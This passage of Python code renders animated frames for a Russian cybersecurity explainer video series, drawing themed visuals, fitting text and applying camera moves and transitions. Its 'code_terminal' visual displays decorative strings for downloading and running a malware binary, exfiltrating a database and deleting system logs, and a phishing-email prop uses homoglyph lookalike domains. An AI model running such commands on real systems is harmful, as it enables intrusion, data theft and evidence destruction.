        # тёмный глаз: концентрические дуги + зрачок (текст идёт оверлеем, не тут)
        cx, cy = W // 2, H // 2 - 100
        for i, rr in enumerate((300, 230, 160, 100)):
            col = accent if i % 2 == 0 else P["line"]
            d.ellipse([cx - rr, cy - rr, cx + rr, cy + rr], outline=col, width=4)
        pr = int(60 + 20 * p)
        d.ellipse([cx - pr, cy - pr, cx + pr, cy + pr], fill=accent)
        d.line([(cx - 300, cy - 120), (cx - 60, cy - 40)], fill=(220, 235, 255), width=8)
    elif visual == "person":
        # абстрактный силуэт с контровым светом + светящийся телефон в руке
        cx = W // 2
        d.ellipse([cx - 130, 480, cx + 130, 740], fill=(8, 11, 20), outline=accent, width=4)
        d.rounded_rectangle([cx - 220, 780, cx + 220, 1420], radius=120, fill=(8, 11, 20),
                            outline=accent, width=4)
        d.rounded_rectangle([cx + 90, 1050, cx + 250, 1330], radius=30, fill=(30, 60, 120),
                            outline=accent, width=3)
        img = _glow_spot(img.convert("RGBA"), cx + 170, 1190, 220, accent, 70).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
    elif visual == "consequence":
        # эскалация масштаба БЕЗ кругов: вложенные панели растут с прогрессом,
        # угловые метки + микротекст. Текст тезиса идёт оверлеем поверх.
        cx, cy = W // 2, H // 2 - 60
        grow = 0.55 + 0.45 * p
        for i in range(4):
            hw = int((300 + i * 130) * grow)
            hh = int((200 + i * 95) * grow)
            col = accent if i == 3 else P["line"]
            d.rounded_rectangle([cx - hw, cy - hh, cx + hw, cy + hh],
                                radius=26, outline=col, width=4 if i == 3 else 2)
        # угловые скобки внешней панели
        L = 54
        x0, y0 = cx - hw, cy - hh
        x1, y1 = cx + hw, cy + hh
        for (sx, sy) in ((x0, y0), (x1, y0), (x0, y1), (x1, y1)):
            dx = 1 if sx == x0 else -1
            dy = 1 if sy == y0 else -1
            d.line([(sx, sy), (sx + dx * L, sy)], fill=accent, width=5)
            d.line([(sx, sy), (sx, sy + dy * L)], fill=accent, width=5)
        img = _glow_spot(img.convert("RGBA"), cx, cy, int(160 + 200 * p), accent, 70).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
        _center_text(d, y1 + 44, "// МАСШТАБ РАСТЁТ", f_xs, P["sub"], cx)
    elif visual == "pause_black":
        d.rectangle([0, 0, W, H], fill=(1, 2, 4))
        pulse = 0.5 + 0.5 * math.sin(p * math.pi * 2)
        d.line([(W // 2 - 120, H // 2 + 420), (W // 2 + 120, H // 2 + 420)],
               fill=accent, width=int(2 + 4 * pulse))
    elif visual == "question":
        _bokeh_layer(d, seed + 6, P, 16)
        d.ellipse([W // 2 - 260, H // 2 - 500, W // 2 + 260, H // 2 + 20],
                  outline=accent, width=6)
        _center_text(d, H // 2 - 330, "?", _font(EXO2, 300, 900), accent, W // 2)
    elif visual == "final_brand":
        _bokeh_layer(d, seed + 7, P, 20)
        _center_text(d, H // 2 - 140, "TRUSTNODE", _font(EXO2, 120, 900), (245, 248, 255), W // 2)
        d.rectangle([W // 2 - 200, H // 2 + 40, W // 2 + 200, H // 2 + 52], fill=accent)
        _center_text(d, H // 2 + 120, "КИБЕРБЕЗОПАСНОСТЬ", f_s, accent, W // 2)
        _center_text(d, H // 2 + 190, "ПРОСТЫМИ СЛОВАМИ", f_s, P["sub"], W // 2)
    elif visual == "flash":
        # ударная типографическая вставка: почти чёрный + сканлайны +
        # микро-метаданные по углам (без кругов и тяжёлой графики)
        d.rectangle([0, 0, W, H], fill=(2, 3, 6))
        for y in range(0, H, 9):
            d.line([(0, y), (W, y)], fill=(16, 24, 42, 110))
        d.rectangle([SAFE_L - 30, SAFE_T - 30, SAFE_R + 30, SAFE_B + 30],
                    outline=P["line"], width=2)
        _center_text(d, SAFE_T - 6, "// TRUSTNODE // 09:16", f_xs, P["sub"], W // 2)
        slide = int(160 * (1 - min(1.0, p * 3)))
        d.rectangle([SAFE_L - 30 + slide, SAFE_B - 60, SAFE_L + 220 + slide, SAFE_B - 52],
                    fill=accent)
    elif visual == "final_q":
        # финал: почти чёрный кадр, faint-глоу снизу, текст — оверлеем whisper
        d.rectangle([0, 0, W, H], fill=(1, 2, 4))
        img = _glow_spot(img.convert("RGBA"), W // 2, H + 120, 620, accent, 40).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
        pulse = 0.5 + 0.5 * math.sin(p * math.pi * 2)
        d.line([(W // 2 - 90, H // 2 + 330), (W // 2 + 90, H // 2 + 330)],
               fill=accent, width=int(2 + 3 * pulse))
    elif visual == "keyboard":
        # macro: клавиши ноутбука ночью + свет экрана на руках
        _bokeh_layer(d, seed + 8, P, 10)
        base_y = H // 2 - 120
        for r_ in range(4):
            y = base_y + r_ * 150
            for c_ in range(6):
                x = 90 + c_ * 155
                lit = ((r_ * 5 + c_ * 2 + int(p * 8)) % 9 == 0)
                d.rounded_rectangle([x, y, x + 120, y + 110], radius=16,
                                    fill=(26, 38, 64) if lit else (10, 15, 28),
                                    outline=accent if lit else P["line"],
                                    width=3 if lit else 2)
        # свет экрана сверху
        for i in range(5):
            yy = 120 + i * 26
            d.rectangle([120, yy, W - 120, yy + 10], fill=accent)
        img = _glow_spot(img.convert("RGBA"), W // 2, 200, 380, accent, 55).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
    elif visual == "face_glow":
        # лицо, освещённое смартфоном в темноте: тёмный овал + светящийся прямоугольник
        # (M20: координаты от H — работает и в 16:9)
        cx = W // 2
        d.ellipse([cx - 200, int(H * 0.29), cx + 200, int(H * 0.5625)],
                  fill=(10, 13, 22), outline=P["line"], width=3)
        d.rounded_rectangle([cx - 130, int(H * 0.60), cx + 130, int(H * 0.755)],
                            radius=24, fill=(24, 44, 92),
                            outline=accent, width=3)
        img = _glow_spot(img.convert("RGBA"), cx, int(H * 0.68),
                         int(200 + 120 * p), accent, 80).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
        _center_text(d, int(H * 0.79), "// ЭКРАН ОСВЕЩАЕТ ЛИЦО", f_xs, P["sub"], cx)
    elif visual == "switch_macro":
        # macro сетевого оборудования: ряды портов + мигающие LED
        _bokeh_layer(d, seed + 9, P, 8)
        for r_ in range(5):
            y = 420 + r_ * 220
            d.rounded_rectangle([80, y, W - 80, y + 160], radius=12, fill=(9, 14, 27),
                                outline=P["line"], width=2)
            for u in range(8):
                x = 140 + u * 105
                led = accent if ((r_ * 3 + u * 5 + int(p * 14)) % 6 == 0) else (36, 56, 90)
                d.ellipse([x, y + 66, x + 26, y + 92], fill=led)
                d.rectangle([x + 34, y + 70, x + 66, y + 88], fill=(24, 34, 56))
    elif visual == "server_corridor":
        # коридор серверных стоек с перспективой к центру
        cx = W // 2
        for i in range(6):
            t = i / 5
            hw = int(420 * (1 - t * 0.72))
            y0 = int(240 + t * 620)
            y1 = int(y0 + 900 * (1 - t * 0.72))
            col = accent if i == 5 else P["line"]
            d.rounded_rectangle([cx - hw, y0, cx + hw, y1], radius=10,
                                fill=(8, 12, 24), outline=col, width=4 if i == 5 else 2)
            for u in range(4):
                lx = cx - hw + 60 + u * ((2 * hw - 120) // 3)
                led = accent if ((i + u + int(p * 10)) % 4 == 0) else (36, 56, 90)
                d.ellipse([lx, y0 + 40, lx + 18, y0 + 58], fill=led)
        img = _glow_spot(img.convert("RGBA"), cx, H // 2, 300, accent, 50).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
    elif visual == "qr_scan":
        # сканирование QR смартфоном: крупный QR + рамка видоискателя
        qs, qn = 560, 25
        qx, qy = (W - qs) // 2, H // 2 - 260
        sc_q = 0.8 + 0.35 * p
        qs2 = int(qs * sc_q)
        qx2 = (W - qs2) // 2
        qy2 = qy - (qs2 - qs) // 2
        d.rectangle([qx2 - 20, qy2 - 20, qx2 + qs2 + 20, qy2 + qs2 + 20],
                    fill=(235, 240, 250))
        cell = qs2 / qn
        for r_ in range(qn):
            for c_ in range(qn):
                in_f = (r_ < 7 and c_ < 7) or (r_ < 7 and c_ >= qn - 7) or (r_ >= qn - 7 and c_ < 7)
                if in_f or rnd.random() < 0.42:
                    d.rectangle([qx2 + c_ * cell, qy2 + r_ * cell,
                                 qx2 + (c_ + 1) * cell, qy2 + (r_ + 1) * cell],
                                fill=(8, 10, 16))
        L = 90
        for (sx, sy, dx, dy) in ((qx2 - 46, qy2 - 46, 1, 1), (qx2 + qs2 + 46, qy2 - 46, -1, 1),
                                 (qx2 - 46, qy2 + qs2 + 46, 1, -1),
                                 (qx2 + qs2 + 46, qy2 + qs2 + 46, -1, -1)):
            d.line([(sx, sy), (sx + dx * L, sy)], fill=accent, width=7)
            d.line([(sx, sy), (sx, sy + dy * L)], fill=accent, width=7)

    # ---- M23: тематические художники ----
    elif visual == "lock_shield":
        # замок-щит: крупный силуэт замка + щит фоне,安全感
        cx, cy = W // 2, H // 2 - 60
        # щит
        pts = [(cx, cy - 320), (cx + 200, cy - 180), (cx + 200, cy + 100),
               (cx, cy + 320), (cx - 200, cy + 100), (cx - 200, cy - 180)]
        d.polygon(pts, fill=(12, 18, 32), outline=accent, width=5)
        # замок
        d.rounded_rectangle([cx - 60, cy - 40, cx + 60, cy + 80], radius=12,
                            fill=(18, 28, 50), outline=accent, width=4)
        d.arc([cx - 40, cy - 100, cx + 40, cy - 20], 180, 0,
              fill=accent, width=5)
        # ключевое отверстие
        d.ellipse([cx - 10, cy + 10, cx + 10, cy + 40], fill=accent)
        d.rectangle([cx - 4, cy + 30, cx + 4, cy + 60], fill=accent)
        pulse = 0.5 + 0.5 * math.sin(p * math.pi * 2)
        img = _glow_spot(img.convert("RGBA"), cx, cy, int(200 + 100 * pulse), accent, 60).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
    elif visual == "wallet_crypto":
        # крипто-кошелёк + монеты + график
        _bokeh_layer(d, seed + 20, P, 10)
        cx, cy = W // 2, H // 2
        # кошелёк
        d.rounded_rectangle([cx - 160, cy - 100, cx + 160, cy + 80], radius=24,
                            fill=(18, 24, 44), outline=accent, width=4)
        d.rounded_rectangle([cx + 80, cy - 50, cx + 160, cy + 20], radius=12,
                            fill=(24, 36, 64), outline=accent, width=3)
        # монеты
        for i in range(4):
            ox = cx - 100 + i * 70
            oy = cy + 160 + int(30 * math.sin(p * math.pi * 2 + i))
            d.ellipse([ox - 28, oy - 28, ox + 28, oy + 28],
                      fill=(200, 170, 60), outline=(140, 110, 20), width=3)
            _center_text(d, oy - 14, "₿", _font(EXO2, 24, 900), (80, 60, 10), ox)
        # график
        pts = [(cx - 180, cy + 340)]
        for x in range(0, 360, 20):
            gy = int(cy + 300 - 80 * math.sin((x / 360.0) * math.pi * 2 + p * 2))
            pts.append((cx - 180 + x, gy))
        d.line(pts, fill=accent, width=3)
    elif visual == "cloud_data":
        # облако + пакеты данных
        cx, cy = W // 2, H // 2 - 100
        # облако из кругов
        for ox, oy, r_ in [(-80, 0, 80), (0, -40, 100), (80, 0, 80), (-40, 30, 70), (40, 30, 70)]:
            d.ellipse([cx + ox - r_, cy + oy - r_, cx + ox + r_, cy + oy + r_],
                      fill=(14, 22, 40), outline=P["line"], width=2)
        # пакеты данных падают из облака
        for i in range(5):
            px = cx - 120 + i * 60
            py = cy + 140 + int((p * 200 + i * 50) % 300)
            sz = 18 + (i % 3) * 6
            d.rectangle([px - sz, py - sz, px + sz, py + sz],
                        fill=accent if i % 2 == 0 else P["line"])
        _center_text(d, cy + 500, "// ДАННЫЕ В ОБЛАКЕ", f_xs, P["sub"], cx)
    elif visual == "mobile_notif":
        # уведомление на экране смартфона
        _bokeh_layer(d, seed + 21, P, 12)
        cx, cy = W // 2, H // 2
        box = _phone_frame(d, P, cx, cy, glow=accent)
        # уведомление
        nx, ny = box[0] + 40, box[1] + 120
        nw = box[2] - box[0] - 80
        d.rounded_rectangle([nx, ny, nx + nw, ny + 100], radius=16,
                            fill=(20, 32, 58), outline=accent, width=3)
        _center_text(d, ny + 12, "⚠ УВЕДОМЛЕНИЕ", f_xs, accent, cx)
        _center_text(d, ny + 48, "ТРЕВОЖНОЕ", f_xs, P["sub"], cx)
        # красная точка
        d.ellipse([nx + nw - 20, ny + 10, nx + nw + 4, ny + 34], fill=(255, 60, 60))
    elif visual == "email_phish":
        # поддельное письмо
        _bokeh_layer(d, seed + 22, P, 10)
        cx, cy = W // 2, H // 2
        # конверт
        d.rounded_rectangle([cx - 220, cy - 160, cx + 220, cy + 120], radius=16,
                            fill=(18, 26, 48), outline=P["line"], width=3)
        d.line([(cx - 220, cy - 160), (cx, cy - 20)], fill=P["line"], width=2)
        d.line([(cx + 220, cy - 160), (cx, cy - 20)], fill=P["line"], width=2)
        # «от» и «тема»
        d.text((cx - 190, cy - 120), "From: bank@reаl.com", font=f_xs, fill=P["sub"])
        d.text((cx - 190, cy - 80), "Subject: Ваш акаунт", font=f_s, fill=(240, 244, 252))
        # красный flag
        d.polygon([(cx + 140, cy - 120), (cx + 200, cy - 100), (cx + 140, cy - 80)],
                  fill=(220, 50, 50))
        # ссылка
        d.text((cx - 190, cy + 20), "https://bаnk-login.secure...", font=f_xs, fill=(255, 120, 60))
        img = _glow_spot(img.convert("RGBA"), cx, cy + 20, 200, (255, 120, 60), 40).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
    elif visual == "code_terminal":
        # терминал + строки кода
        d.rectangle([60, 200, W - 60, H - 300], fill=(6, 10, 18), outline=P["line"], width=3)
        # заголовок терминала
        d.rectangle([60, 200, W - 60, 260], fill=(16, 24, 40))
        d.text((80, 210), "root@server:~$", font=f_xs, fill=accent)
        # строки кода
        code_lines = [
            "$ wget http://malware.bin", "$ chmod +x malware.bin",
            "$ ./malware.bin --stealth", "# EXPLOIT: CVE-2024-1234",
            "$ exfil --target database", ">> ACCESS GRANTED",
            "# BACKDOOR installed", "$ rm -rf /var/log/*",
        ]
        visible = min(len(code_lines), int(p * len(code_lines)) + 1)
        for i in range(visible):
            y = 290 + i * 60
            col = accent if "EXPLOIT" in code_lines[i] or "ACCESS" in code_lines[i] else (80, 120, 80)
            if "malware" in code_lines[i]:
                col = (255, 80, 60)
            d.text((80, y), code_lines[i][:50], font=f_xs, fill=col)
        # мигающий курсор
        if int(p * 4) % 2 == 0:
            vy = 290 + visible * 60
            d.rectangle([80, vy, 96, vy + 24], fill=accent)
    elif visual == "net_graph":
        # сетевой граф + бегущий пакет
        _bokeh_layer(d, seed + 23, P, 8)
        nodes = [(W // 2, 350), (250, 650), (W - 250, 650),
                 (180, 1000), (W // 2, 900), (W - 180, 1000),
                 (W // 2, 1350)]
        # рёбра
        edges = [(0, 1), (0, 2), (1, 3), (1, 4), (2, 4), (2, 5), (3, 6), (4, 6), (5, 6)]
        for a, b in edges:
            d.line([nodes[a], nodes[b]], fill=P["line"], width=2)
        # бегущий пакет
        ei = int(p * len(edges)) % len(edges)
        a, b = edges[ei]
        t_ = (p * len(edges)) % 1.0
        px = int(nodes[a][0] + (nodes[b][0] - nodes[a][0]) * t_)
        py = int(nodes[a][1] + (nodes[b][1] - nodes[a][1]) * t_)
        # узлы
        for i, (nx, ny) in enumerate(nodes):
            r_ = 30 if i != 6 else 44
            col = accent if i == 6 else P["line"]
            d.ellipse([nx - r_, ny - r_, nx + r_, ny + r_], fill=(12, 18, 32), outline=col, width=3)
        img = _glow_spot(img.convert("RGBA"), px, py, 60, accent, 80).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
    elif visual == "cam_surveillance":
        # камера + конус обзора + REC
        cx, cy = W // 2, 380
        # камера
        d.rounded_rectangle([cx - 60, cy - 30, cx + 60, cy + 30], radius=8,
                            fill=(30, 40, 60), outline=P["line"], width=3)
        d.rectangle([cx + 60, cy - 10, cx + 120, cy + 10], fill=(30, 40, 60))
        d.ellipse([cx + 100, cy - 16, cx + 140, cy + 16], outline=accent, width=3)
        # конус обзора
        pts_cone = [(cx - 40, cy + 30), (cx - 320, H - 300), (cx + 320, H - 300)]
        # полупрозрачный конус через наложение
        cone_img = Image.new("RGBA", (W, H), (0, 0, 0, 0))
        cone_d = ImageDraw.Draw(cone_img, "RGBA")
        cone_d.polygon(pts_cone, fill=(accent[0], accent[1], accent[2], 25))
        img = Image.alpha_composite(img.convert("RGBA"), cone_img).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
        # REC
        rec_x, rec_y = W - 180, 180
        blink = int(p * 3) % 2 == 0
        if blink:
            d.ellipse([rec_x - 10, rec_y - 10, rec_x + 10, rec_y + 10], fill=(255, 40, 40))
        d.text((rec_x + 16, rec_y - 10), "REC", font=f_s, fill=(255, 40, 40) if blink else P["sub"])
        _center_text(d, H - 260, "// НАБЛЮДЕНИЕ", f_xs, P["sub"], W // 2)
    elif visual == "firewall_wall":
        # кирпичная стена + огненная линия
        brick_w, brick_h = 80, 40
        for row in range(18):
            y0 = 260 + row * brick_h
            offset = brick_w // 2 if row % 2 else 0
            for col in range(-1, W // brick_w + 2):
                x0 = col * brick_w + offset
                breach = (abs(x0 - W // 2) < 120 and 8 <= row <= 12)
                if not breach:
                    d.rectangle([x0 + 2, y0 + 2, x0 + brick_w - 2, y0 + brick_h - 2],
                                fill=(22, 34, 56), outline=(16, 24, 42), width=1)
        # огненная линия — горизонтальный accent-бар
        fire_y = 260 + 10 * brick_h
        d.rectangle([0, fire_y - 4, W, fire_y + 4], fill=accent)
        # искры в точке прорыва
        spark_x = W // 2
        for i in range(6):
            sx = spark_x + int(rnd.gauss(0, 80))
            sy = fire_y + int(rnd.gauss(0, 40))
            d.ellipse([sx - 4, sy - 4, sx + 4, sy + 4], fill=accent)
        img = _glow_spot(img.convert("RGBA"), spark_x, fire_y, 120, (255, 100, 30), 70).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
        _center_text(d, fire_y + 50, "// FIREWALL", f_xs, accent, W // 2)
    elif visual == "ai_brain":
        # нейросеть: 5 слоёв, связи между нейронами
        layers = [3, 5, 6, 5, 3]
        layer_x = [140, 340, W // 2, W - 340, W - 140]
        neurons = []
        for li, count in enumerate(layers):
            layer_neurons = []
            spacing = 280 // (count + 1)
            for ni in range(count):
                ny = H // 2 - 140 + (ni + 1) * spacing
                layer_neurons.append((layer_x[li], ny))
            neurons.append(layer_neurons)
        # связи
        for li in range(len(neurons) - 1):
            for a in neurons[li]:
                for b in neurons[li + 1]:
                    d.line([a, b], fill=P["line"], width=1)
        # активированные связи (бегущий импульс)
        active_layer = int(p * (len(neurons) - 1))
        if active_layer < len(neurons) - 1:
            for a in neurons[active_layer]:
                for b in neurons[active_layer + 1]:
                    d.line([a, b], fill=accent, width=2)
        # нейроны
        for li, layer_neurons in enumerate(neurons):
            for nx, ny in layer_neurons:
                r_ = 18
                is_active = li == active_layer
                col = accent if is_active else P["line"]
                d.ellipse([nx - r_, ny - r_, nx + r_, ny + r_],
                          fill=(14, 22, 40) if not is_active else (accent[0] // 2, accent[1] // 2, accent[2] // 2),
                          outline=col, width=3)
        img = _glow_spot(img.convert("RGBA"), W // 2, H // 2, 250, accent, 50).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")

    img = _vignette(img)
    img = _grain(img, seed)
    return img


# ---------- kinetic typography (safe area: текст НИКОГДА не обрезается) ----------

def _wrap_to_width(d, line, f, max_w):
    """Жадный перенос строки по словам под max_w. Возвращает <=3 строк."""
    words, out, cur = str(line).split(), [], ""
    for w_ in words:
        trial = (cur + " " + w_).strip()
        if _ts(d, trial, f)[0] <= max_w or not cur:
            cur = trial
        else:
            out.append(cur)
            cur = w_
    if cur:
        out.append(cur)
    return out[:3]


def _tracked_width(d, line, f, gap):
    widths = [_ts(d, ch, f)[0] for ch in line]
    return sum(widths) + gap * max(0, len(line) - 1), widths


def fit_text_block(d, lines, mode, fonts):
    """Подбирает шрифт/переносы/трекинг так, чтобы блок влез в SAFE_W.

    Возвращает (font, fitted_lines, gap). Гарантия: ни одна строка не шире
    SAFE_W — обрезка краями кадра невозможна по построению.
    """
    if mode == "whisper":
        sizes = [54, 44, 36]
        getf = lambda sz: _font(JURA, sz, 500)
        gap0 = 8
    elif mode == "sub":
        # TikTok-субтитр: читаемый, спокойный, максимум 2 строки по центру
        sizes = [64, 54, 44]
        getf = lambda sz: _font(JURA, sz, 500)
        gap0 = 0
    else:
        sizes = [118, 88, 64, 48]
        getf = lambda sz: _font(EXO2, sz, 900)
        gap0 = 0
    for sz in sizes:
        f = getf(sz)
        fitted = []
        for ln in lines:
            fitted.extend(_wrap_to_width(d, ln, f, SAFE_W))
        fitted = fitted[:2] if mode == "sub" else fitted[:3]
        if not fitted:
            continue
        if mode == "tracking":
            gap = gap0 or min(46, max(0, (SAFE_W - max(
                _tracked_width(d, ln, f, 0)[0] for ln in fitted)) // max(1, max(
                    len(ln) for ln in fitted) - 1)))
            ok = all(_tracked_width(d, ln, f, gap)[0] <= SAFE_W for ln in fitted)
        else:
            gap = 0
            ok = all(_ts(d, ln, f)[0] <= SAFE_W for ln in fitted)
        if ok:
            return f, fitted, gap
    # последний рубеж: самый мелкий шрифт + жёсткая нарезка по символам
    f = getf(sizes[-1])
    hard = []
    for ln in lines:
        s = ln
        while s:
            hard.append(s[:18])
            s = s[18:]
    return f, hard[:3], 0


def draw_texts(img, texts, p, fonts, P):
    """Типографика поверх кадра строго внутри safe area.

    Возвращает список bbox нарисованных блоков (для QC-проверки).
    """
    if not texts:
        return []
    d = ImageDraw.Draw(img, "RGBA")
    bboxes = []
    n = len(texts)
    for k, t in enumerate(texts):
        lines, mode = t["lines"], t.get("mode", "pop")
        f, fitted, gap = fit_text_block(d, lines, mode, fonts)
        lh = _ts(d, "АЙ", f)[1]
        step = lh + (18 if mode == "whisper" else 26)
        block_h = len(fitted) * step
        if mode == "whisper":
            y_base = H // 2 - 120 - block_h // 2
        elif mode == "sub":
            # S28: субтитры в НИЖНЕЙ ТРЕТИ экрана (TikTok-style)
            y_base = int(H * 0.82) - block_h // 2
        else:
            zone_h = 340
            y_base = H // 2 - (n * zone_h) // 2 + k * zone_h
        # кламп по вертикали в safe area
        y_base = max(SAFE_T, min(SAFE_B - block_h, y_base))
        q = min(1.0, p / 0.3) if p < 0.3 else 1.0
        alpha = int(255 * min(1.0, p / 0.12))
        for j, line in enumerate(fitted):
            if mode == "tracking":
                tw, _ = _tracked_width(d, line, f, gap)
            else:
                tw, _ = _ts(d, line, f)
            y = y_base + j * step
            x = (W - tw) // 2
            # кламп по горизонтали в safe area (оборона в глубину)
            x = max(SAFE_L, min(SAFE_R - tw, x))
            d.rounded_rectangle([x - 30, y - 14, x + tw + 30, y + lh + 14],
                                radius=20, fill=(3, 5, 10, 190))
            bboxes.append((x, y, x + tw, y + lh))
            if mode == "pop":
                sc = 0.6 + 0.4 * (1 - (1 - q) ** 3)
                tmp = Image.new("RGBA", (int(tw) + 80, lh + 60), (0, 0, 0, 0))
                td = ImageDraw.Draw(tmp)
                td.text((40, 30), line, font=f, fill=(245, 248, 255, alpha),
                        stroke_width=3, stroke_fill=(3, 5, 10, alpha))
                nw, nh = max(1, int(tmp.width * sc)), max(1, int(tmp.height * sc))
                tmp = tmp.resize((nw, nh), Image.BICUBIC)
                img.paste(tmp, ((W - nw) // 2, int(y + (lh - nh) // 2)), tmp)
            elif mode == "tracking":
                _, widths = _tracked_width(d, line, f, gap)
                xx = x
                for ch, cw in zip(line, widths):
                    d.text((xx, y), ch, font=f, fill=(245, 248, 255, alpha),
                           stroke_width=3, stroke_fill=(3, 5, 10, alpha))
                    xx += cw + gap
            elif mode == "whisper" or mode == "sub":
                # маленький текст, медленное проявление, лёгкий трекинг
                a2 = int(255 * min(1.0, p / 0.35))
                _, widths = _tracked_width(d, line, f, gap)
                xx = x
                for ch, cw in zip(line, widths):
                    d.text((xx, y), ch, font=f, fill=(235, 240, 252, a2),
                           stroke_width=2, stroke_fill=(3, 5, 10, a2))
                    xx += cw + gap
            elif mode == "reveal":
                if q < 1.0:
                    tmp = Image.new("RGBA", (int(tw) + 40, lh + 40), (0, 0, 0, 0))
                    td = ImageDraw.Draw(tmp)
                    td.text((20, 20), line, font=f, fill=(245, 248, 255, alpha),
                            stroke_width=3, stroke_fill=(3, 5, 10, alpha))
                    vis = int(tmp.width * q)
                    if vis > 0:
                        img.paste(tmp.crop((0, 0, vis, tmp.height)),
                                  (int(x) - 20, int(y) - 20),
                                  tmp.crop((0, 0, vis, tmp.height)))
                else:
                    d.text((x, y), line, font=f, fill=(245, 248, 255, alpha),
                           stroke_width=3, stroke_fill=(3, 5, 10, alpha))
            else:  # rise
                yy = int(y + 90 * (1 - q))
                d.text((x, yy), line, font=f, fill=(245, 248, 255, alpha),
                       stroke_width=3, stroke_fill=(3, 5, 10, alpha))
    return bboxes


def draw_tracked(d, line, f, y, gap, alpha):
    _, widths = _tracked_width(d, line, f, gap)
    x = (W - (sum(widths) + gap * max(0, len(line) - 1))) // 2
    for ch, cw in zip(line, widths):
        d.text((x, y), ch, font=f, fill=(245, 248, 255, alpha),
               stroke_width=2, stroke_fill=(3, 5, 10, alpha))
        x += cw + gap


# ---------- камера и переходы ----------

def apply_camera(img, camera, p, seed, frame_i):
    """Движение камеры как пост-трансформация кадра.

    M26-B: «дыхание» — у static-шотов лёгкий синусоидальный дрейф,
    чтобы кадр НИКОГДА не стоял намертво: соседние кадры связаны,
    видео ощущается цельным, а не покадровым. Амплитуда мала, это
    незаметно как «движение», но убивает эффект слайд-шоу.
    """
    if camera == "static":
        # дыхание: ±3 px по синусу от прогресса шота + лёгкий микро-зум.
        # Расширяем кадр на 8px и двигаем окно — краёв чёрных нет.
        # S29: softer breathing (was ±3px, now ±2px)
        dx = int(2.0 * math.sin(p * math.tau * 1.5))
        dy = int(1.5 * math.cos(p * math.tau * 1.5 + 1.1))
        big = img.resize((W + 6, H + 6), Image.BICUBIC)
        ox, oy = 3 - dx, 3 - dy
        return big.crop((ox, oy, ox + W, oy + H))
    if camera == "shake":
        rnd = random.Random(seed + frame_i)
        dx, dy = rnd.randrange(-4, 5), rnd.randrange(-4, 5)  # S29: softer shake (was ±9)
        out = Image.new("RGB", (W, H), (0, 0, 0))
        out.paste(img, (dx, dy))
        return out
    if camera == "drift":
        dx = int(-25 * p)  # S29: softer drift (was 40)
        big = img.resize((W + 50, H), Image.BICUBIC)
        return big.crop((50 + dx, 0, 50 + dx + W, H))
    if camera == "snap":
        # резкий наезд: snap-zoom к концу шота
        s = 1.0 + 0.20 * (p ** 2)  # S29: softer snap (was 0.42)
        bw, bh = int(W * s), int(H * s)
        big = img.resize((bw, bh), Image.BICUBIC)
        return big.crop(((bw - W) // 2, (bh - H) // 2, (bw - W) // 2 + W, (bh - H) // 2 + H))
    if camera == "tilt":
        # S29: softer tilt (was ±2.0°, now ±1.2°)
        ang = -1.2 + 2.4 * p
        big = img.resize((int(W * 1.12), int(H * 1.12)), Image.BICUBIC)
        big = big.rotate(ang, resample=Image.BICUBIC, center=(big.width // 2, big.height // 2))
        bw, bh = big.size
        return big.crop(((bw - W) // 2, (bh - H) // 2, (bw - W) // 2 + W, (bh - H) // 2 + H))
    if camera == "whip_pan":
        # S29: softer whip-pan (was 0.55, too aggressive)
        dx = int(W * 0.30 * p)
        big = img.resize((W + int(W * 0.30) + 40, H), Image.BICUBIC)
        out = big.crop((dx, 0, dx + W, H))
        d = ImageDraw.Draw(out, "RGBA")
        rnd = random.Random(seed + frame_i // 3)
        for _ in range(14):
            y = rnd.randrange(H)
            d.line([(0, y), (W, y)], fill=(150, 180, 230, 46))
        return out
    # push_in / push_out — S29: softer travel (was 0.24, too aggressive)
    s = (1.0 + 0.12 * p) if camera == "push_in" else (1.12 - 0.12 * p)
    bw, bh = int(W * s), int(H * s)
    big = img.resize((bw, bh), Image.BICUBIC)
    return big.crop(((bw - W) // 2, (bh - H) // 2, (bw - W) // 2 + W, (bh - H) // 2 + H))


def _rgb_split(img, dx):
    r, g, b = img.split()
    r = r.transform((W, H), Image.AFFINE, (1, 0, -dx, 0, 1, 0))
    b = b.transform((W, H), Image.AFFINE, (1, 0, dx, 0, 1, 0))
    return Image.merge("RGB", (r, g, b))


def transition_frame(img_a, img_b, kind, q, seed):
    """Один кадр перехода A->B. q — прогресс 0..1."""
    q = max(0.0, min(1.0, q))
    if kind == "hard_cut":
        return img_b if q >= 0.5 else img_a
    if kind == "dip":
        black = Image.new("RGB", (W, H), (0, 0, 0))
        if q < 0.5:
            return Image.blend(img_a, black, q * 2)
        return Image.blend(black, img_b, (q - 0.5) * 2)
    if kind == "whip":
        # B влетает справа, A уходит влево + motion-streaks
        ax = -int(W * 0.35 * q)
        bx = int(W * (1 - q))
        out = Image.new("RGB", (W, H), (0, 0, 0))
        out.paste(img_a, (ax, 0))
        out.paste(img_b, (bx, 0))
        d = ImageDraw.Draw(out, "RGBA")
        rnd = random.Random(seed)
        for _ in range(26):
            y = rnd.randrange(H)
            d.line([(0, y), (W, y)], fill=(150, 180, 230, int(60 * q * (1 - q) * 4)))
        return out
    if kind == "zoom":
        # наезд сквозь A в B
        sa = 1.0 + 0.55 * q
        ba = img_a.resize((int(W * sa), int(H * sa)), Image.BICUBIC)
        ba = ba.crop(((ba.width - W) // 2, (ba.height - H) // 2,
                      (ba.width - W) // 2 + W, (ba.height - H) // 2 + H))
        sb = 0.82 + 0.18 * q
        bb = img_b.resize((max(1, int(W * sb)), max(1, int(H * sb))), Image.BICUBIC)
        canvas = Image.new("RGB", (W, H), (0, 0, 0))
        canvas.paste(bb, ((W - bb.width) // 2, (H - bb.height) // 2))
        return Image.blend(ba, canvas, min(1.0, q * 1.4))
    if kind == "match":
        # match cut: A и B связаны масштабом — лёгкий общий наезд + кроссфейд.
        # Работает между визуально похожими кадрами (экраны, серверы).
        s = 1.0 + 0.10 * q
        def _sc(im):
            bw, bh = int(W * s), int(H * s)
